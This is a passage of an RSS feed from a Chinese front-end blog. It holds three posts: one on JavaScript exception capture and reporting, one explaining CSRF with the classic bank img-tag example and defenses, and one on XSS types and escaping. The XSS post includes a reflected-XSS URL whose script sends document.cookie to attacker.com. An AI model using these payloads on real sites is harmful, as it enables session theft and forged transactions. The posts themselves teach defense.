&lt;h4 id=&quot;windowonerror&quot;&gt;window.onerror&lt;/h4&gt;

&lt;p&gt;浏览器提供了一个全局的异常捕获API：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onerror&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lineno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;colno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;

  &lt;p&gt;函数参数：&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;message&lt;/code&gt;：错误信息（字符串）。可用于HTML &lt;code class=&quot;highlighter-rouge&quot;&gt;onerror=&quot;&quot;&lt;/code&gt;处理程序中的&lt;code class=&quot;highlighter-rouge&quot;&gt;event&lt;/code&gt;。&lt;/li&gt;
    &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;source&lt;/code&gt;：发生错误的脚本URL（字符串）&lt;/li&gt;
    &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lineno&lt;/code&gt;：发生错误的行号（数字）&lt;/li&gt;
    &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;colno&lt;/code&gt;：发生错误的列号（数字）&lt;/li&gt;
    &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;error&lt;/code&gt;：&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error&quot;&gt;Error对象&lt;/a&gt;（对象）&lt;/li&gt;
  &lt;/ul&gt;

  &lt;p&gt;若该函数返回&lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;，则阻止执行默认事件处理函数。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;通过这个api，我们基本上能实现同域脚本的异常捕获。注意，为了捕获全局异常，&lt;em&gt;window.onerror&lt;/em&gt;需要放在其他脚本的前面。&lt;/p&gt;

&lt;p&gt;但是，因为浏览器的&lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=363897&quot;&gt;限制&lt;/a&gt;，当加载不同域的脚本中发生语法错误时，&lt;em&gt;window.onerror&lt;/em&gt;捕获到的只是一句简单的&lt;strong&gt;“Script error.”&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;要想拿到不同域脚本里的详细异常信息，我们需要给该脚本的&lt;strong&gt;script&lt;/strong&gt;标签添加crossOrigin属性，代表着启用&lt;strong&gt;CORS&lt;/strong&gt;（跨域资源共享）。&lt;/p&gt;

&lt;p&gt;同时，该脚本资源也必须设置CORS。一般我们会把js放在cdn上，所以需要去cdn上设置CORS的内容，例如Allow-Origin，Allow-Methods。&lt;/p&gt;

&lt;p&gt;完成上面的操作后，&lt;em&gt;window.onerror&lt;/em&gt;就能捕获到不同域脚本异常的具体信息了。&lt;/p&gt;

&lt;h4 id=&quot;trycatch&quot;&gt;&lt;strong&gt;try…catch&lt;/strong&gt;&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;try…catch&lt;/strong&gt;语句将能引发错误的代码放在try块中，并且对应一个响应，然后有异常被抛出。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我们可以手动给代码块添加&lt;em&gt;try…catch&lt;/em&gt;语句，比如&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;myException&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// generates an exception&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;// statements to handle any exceptions&lt;/span&gt;
   &lt;span class=&quot;nx&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 上报错误&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这是一种侵入式的捕获异常方式。&lt;/p&gt;

&lt;p&gt;需要注意的是&lt;em&gt;try…catch&lt;/em&gt;语句无法捕获异步的函数，就是说，我们给请求网络的函数包裹了&lt;em&gt;try…catch&lt;/em&gt;后，还得给网络的回调函数添加&lt;em&gt;try…catch&lt;/em&gt;语句。太麻烦啦。。。我选择死亡。。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;这里提供一个思路&lt;/strong&gt;，&lt;strong&gt;通过webpack，uglifyJs提供的操作语法树（AST）的功能，对源代码进行预处理，自动给函数加上try/catch&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;另外，如果需要把异常上报系统提供给其他人使用，AST的方案就没办法做了。并且要考虑到跨域的问题的话，这个时候，还可以从封装原生函数角度上去做上报。
我们选择性的封装原生的异步函数，例如&lt;code class=&quot;highlighter-rouge&quot;&gt;setTimeout&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;setInterval&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;Promise&lt;/code&gt;等。&lt;/p&gt;

&lt;h3 id=&quot;捕获异常过程中一些麻烦的点&quot;&gt;&lt;em&gt;捕获异常过程中一些麻烦的点&lt;/em&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;压缩代码定位异常&lt;/p&gt;

    &lt;p&gt;线上代码我们一般都会进行压缩处理，压缩代码无法定位到错误的具体位置。解决方法是添加sourceMap文件。拿到异常信息后，可以通过sourceMap文件定位源代码。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Promise&lt;/em&gt;的异常捕获&lt;/p&gt;

    &lt;p&gt;我们使用&lt;em&gt;Promise&lt;/em&gt;一般会用到它的&lt;strong&gt;catch&lt;/strong&gt;方法，但是我个人很容易漏写。这里可以监听一个全局事件&lt;strong&gt;unhandledrejection&lt;/strong&gt;，可以捕获全局的Promise异常。&lt;/p&gt;

    &lt;p&gt;​&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;异常上报的内容&quot;&gt;&lt;em&gt;异常上报的内容&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;能够捕获异常之后，要问问自己，上报上的异常数据有哪些方面，它们是如何支持问题定位的？&lt;/p&gt;

&lt;p&gt;我个人认为，需要考虑上传用户、网络、设备、数据、函数、流程等内容。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;用户，指用户的uid等标示身份的数据&lt;/li&gt;
  &lt;li&gt;网络，指用户的网络情况&lt;/li&gt;
  &lt;li&gt;设备，指终端的详细信息&lt;/li&gt;
  &lt;li&gt;数据，指当前异常的全局数据（例如redux的store，可以完整的把这个store上传）&lt;/li&gt;
  &lt;li&gt;函数，指发生异常的函数名&lt;/li&gt;
  &lt;li&gt;流程，指异常的堆栈情况&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;主要目的是为了&lt;strong&gt;完整的复现一个异常现场&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&quot;异常上报接口撑不住大流量的访问怎么办&quot;&gt;&lt;em&gt;异常上报接口撑不住大流量的访问怎么办？&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;例如电商网站秒杀时，会有大流量进入网站。这个时候，我们异常上报接口无法处理这么多请求。&lt;/p&gt;

&lt;p&gt;参考一些异常上报系统的做法&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;抽样上报，客户端遇到异常时，随机上报&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;减少重复上报次数，限制同一异常上报的上限次数，避免一个客户端上报太多次同样的异常&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;合并上报，类似&lt;code class=&quot;highlighter-rouge&quot;&gt;underscore&lt;/code&gt;的debounce函数，在一定时间延时内，或者一个队列长度内，我们把异常存在队列中。&lt;/p&gt;

    &lt;p&gt;当队列满了，或者延时到期时，我们一次性把队列内的异常上报。这里减少了请求数，并且减少每次请求需要上报的基础数据的大小。（以前1个异常携带基础数据，多个异常就有多个基础数据）&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;如果捕获异常的代码有问题怎么办&quot;&gt;&lt;em&gt;如果捕获异常的代码有问题，怎么办&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;其实很简单，使用try/catch包裹，捕获它的异常。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;以上是一些关于前端异常捕获的思考点。有不对的地方请留言指教一波，欢迎讨论。&lt;/p&gt;
</description>
        <pubDate>Thu, 14 Jun 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/06/14/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/06/14/js/</guid>
        
        <category>JavaScript</category>
        
        <category>异常监控</category>
        
        
      </item>
    
      <item>
        <title>CSRF攻击</title>
        <description>&lt;h2 id=&quot;csrf&quot;&gt;CSRF&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;跨站请求伪造&lt;/strong&gt;（Cross-site request forgery）&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：&lt;strong&gt;简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie），而CSRF则是利用用户当前的身份去做一些未经过授权的操作。&lt;/p&gt;

&lt;p&gt;维基百科上有一个很经典例子&lt;/p&gt;

&lt;p&gt;假如一家银行用以执行转账操作的URL地址如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;http://www.examplebank.com/withdraw?account=AccoutName&amp;amp;amount=1000&amp;amp;for=PayeeName&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么，一个恶意攻击者可以在另一个网站上放置如下代码：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amp;amount=1000&amp;amp;for=Badman&quot; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。&lt;/p&gt;

&lt;h2 id=&quot;防御措施&quot;&gt;防御措施&lt;/h2&gt;

&lt;h3 id=&quot;检查referer字段&quot;&gt;检查Referer字段&lt;/h3&gt;

&lt;p&gt;http头部有一个&lt;strong&gt;Referer&lt;/strong&gt;字段，这个字段用以标明请求来源于哪个地址。&lt;/p&gt;

&lt;p&gt;假如我们不幸进到攻击者的网站，被强行调用了一个转账的接口。那么这个http请求头部里的&lt;strong&gt;Referer&lt;/strong&gt;指向的是攻击者的网站，服务端判定正确的转账域名和&lt;strong&gt;Referer&lt;/strong&gt;的域名不同，那么就可以判定是恶意的访问。&lt;/p&gt;

&lt;p&gt;但是Referer字段是可以被篡改的，所以这方法存在被绕过的可能。&lt;/p&gt;

&lt;h3 id=&quot;添加校验token&quot;&gt;添加校验token&lt;/h3&gt;

&lt;p&gt;攻击者之所以能利用用户当前的身份去做一些未经过授权的操作，是因为拿到了我们的cookie。那假如我们身份的校验是通过其他的，攻击者无法拿到的东西来实现的呢？&lt;/p&gt;

&lt;p&gt;可以在用户登陆时，服务端从session里取出token，返回给客户端。之后用户所有的请求都需要带上这个token，可以放在http请求头部里。&lt;/p&gt;

&lt;p&gt;当用户请求转账时，如果服务端从http头部里取不到token，或者token是非法的，那么这个请求就有可能是CSRF攻击～&lt;/p&gt;
</description>
        <pubDate>Sat, 02 Jun 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/06/02/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/06/02/js/</guid>
        
        <category>JavaScript</category>
        
        <category>WEB安全</category>
        
        
      </item>
    
      <item>
        <title>XSS攻击</title>
        <description>&lt;h2 id=&quot;xss&quot;&gt;XSS&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;XSS&lt;/strong&gt; (Cross Site Script，缩写为了区分 CSS，把 C 改为 X，X 本就有 Cross 十字的含义），中文称为“跨站脚本”。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;XSS攻击的形式千差万别，但是，它们的共同点为：将一些隐私数据像cookie、session发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;我们只要能把我们可控的 JavaScript 脚本内容注入到目标页面，那这个页面就存在 XSS 漏洞。&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;xss的三种攻击方式&quot;&gt;XSS的三种攻击方式&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;存储型XSS（持久型）&lt;/li&gt;
  &lt;li&gt;反射型XSS（非持久型）&lt;/li&gt;
  &lt;li&gt;基于DOM的XSS&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;刚看到这三个术语的我是懵逼的…&lt;/p&gt;

&lt;p&gt;通过一个场景来介绍下&lt;strong&gt;存储型XSS&lt;/strong&gt;。例如我们进到一个留言板页面，攻击者在留言板上注入一行script脚本。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'XSS'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因为留言板需要保存这个信息，&lt;strong&gt;那么这行脚本会存储在服务器的数据库中&lt;/strong&gt;。所以叫存储型XSS。
当下一个用户访问留言板时，他会看到之前用户的留言，包含攻击者注入的脚本。如果留言板这个网站，没有做防XSS的处理，那么浏览器会把这行脚本解析为script标签，执行里面的js脚本。
&lt;strong&gt;并且，之后每一位用户访问留言板都会受到XSS攻击！&lt;/strong&gt;所以也叫&lt;strong&gt;持久型&lt;/strong&gt;XSS～&lt;/p&gt;

&lt;p&gt;而&lt;strong&gt;反射型XSS&lt;/strong&gt;，它是非持久的。什么意思呢？相比较于存储型XSS，反射型XSS不会把脚本存储到服务端，而是通过欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面。&lt;/p&gt;

&lt;p&gt;假如有一个搜索页面，当我们请求这个页面时，页面会把url参数展示在dom中。&lt;/p&gt;

&lt;p&gt;比如访问&lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.search.com?search=衣服&lt;/code&gt;时，页面展示&lt;code class=&quot;highlighter-rouge&quot;&gt;衣服&lt;/code&gt;字样，并且该页面未做防XSS处理。&lt;/p&gt;

&lt;p&gt;那么当用户访问下面这个链接时，浏览器就会执行search参数后js语句，新建一个Image标签，请求一个接口，把用户在&lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.search.com&lt;/code&gt;下的cookie拿走了。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//www.search.com?search=&amp;lt;script&amp;gt;var+i=new+Image;+i.src=&quot;http://attacker.com/&quot;document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由于浏览器的同源策略并不会判定Image标签跨域，所以攻击者可以拿到用户的cookie～&lt;/p&gt;

&lt;p&gt;假如攻击者拿到我们在该网站的cookie，且我们是登陆的状态，那么攻击者就能用我们的身份做事情了。&lt;/p&gt;

&lt;p&gt;而&lt;strong&gt;基于DOM的XSS&lt;/strong&gt;指的是通过dom的某些属性能执行js脚本，例如 &lt;strong&gt;onclick&lt;/strong&gt;，&lt;strong&gt;innerHTML&lt;/strong&gt;，&lt;strong&gt;document.write&lt;/strong&gt;等属性。反射型XSS的攻击点在于url，而基于DOM的XSS攻击点在与dom的一些属性。&lt;/p&gt;

&lt;h4 id=&quot;那么xss如何防范呢&quot;&gt;&lt;strong&gt;那么XSS如何防范呢？&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;XSS攻击的模式很简单，就是把自己的代码嵌入到页面里，随页面一块执行；XSS攻击的防范也一样简单，对于网站的开发者，首先应该把精力放到对所有用户提交内容进行可靠的输入验证上。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1、html&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;只需要转义&amp;lt; &amp;gt; 即可，只要没有html标签，页面就是安全的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2、JS&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;将要输出到js代码片断中的用户输入内容没有好的办法进行处理；仅转义少数字符不能保证去掉所有的攻击可能。因此，一般建议不要把用户产生的内容直接输出到js片断中。&lt;/p&gt;

&lt;p&gt;如果条件所限，必须将内容直接输出，有如下方法可供选择：&lt;/p&gt;

&lt;p&gt;1) 如果待输出的内容有特定的取值返回或者特定的格式，可以使用白名单或者正则表达式进行处理。&lt;/p&gt;

&lt;p&gt;2) 可以将内容输出到html的隐藏标签或隐藏表单中，js通过获取标签的内容得到该内容。&lt;/p&gt;
</description>
        <pubDate>Fri, 01 Jun 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/06/01/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/06/01/js/</guid>
        
        <category>JavaScript</category>
        
        <category>WEB安全</category>
        
        
      </item>
    
  </channel>
</rss>
